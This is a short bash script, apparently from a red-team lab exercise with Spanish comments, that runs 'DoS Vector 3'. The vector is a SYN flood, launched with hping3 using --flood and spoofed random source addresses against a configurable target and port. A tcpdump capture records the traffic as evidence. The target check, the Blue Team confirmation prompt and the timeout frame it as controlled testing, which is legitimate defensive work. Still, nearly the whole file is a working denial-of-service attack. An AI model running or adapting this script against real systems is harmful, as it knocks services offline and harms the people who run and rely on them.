#!/usr/bin/env bash
# Phase 6 — DoS Vector 3: SYN flood con hping3
# VECTOR MÁS DISRUPTIVO — requiere NET_RAW en el contenedor

source "$(dirname "$0")/../lib/common.sh"

validate_target "${LAB_TARGET}"
EVIDENCE_DIR=$(cat /tmp/dos-evidence-dir 2>/dev/null || { echo "[ERROR] Run 00-baseline.sh first" >&2; exit 1; })
banner "DoS Vector 3 — SYN Flood (hping3)"

PORT="${1:-80}"
DURATION="${2:-30}"

log WARN "VECTOR MÁS DISRUPTIVO. Confirma que Blue Team está monitoreando. (y/N)"
read -r answer
[[ "$answer" != "y" ]] && exit 1

log INFO "Capturing pcap"
tcpdump -i any -w "${EVIDENCE_DIR}/syn-flood.pcap" \
    "host ${LAB_TARGET} and port ${PORT}" &
TCPDUMP_PID=$!

log INFO "Running hping3 SYN flood for ${DURATION}s"
START=$(date +%s)
timeout "${DURATION}" hping3 -S --flood --rand-source \
    -p "${PORT}" "${LAB_TARGET}" \
    > "${EVIDENCE_DIR}/syn-flood.log" 2>&1 || true
END=$(date +%s)

kill "$TCPDUMP_PID" 2>/dev/null || true

log INFO "Vector 3 finished. Duration: $((END-START))s"
log WARN "El servicio puede tardar más que otros vectores en recuperarse"
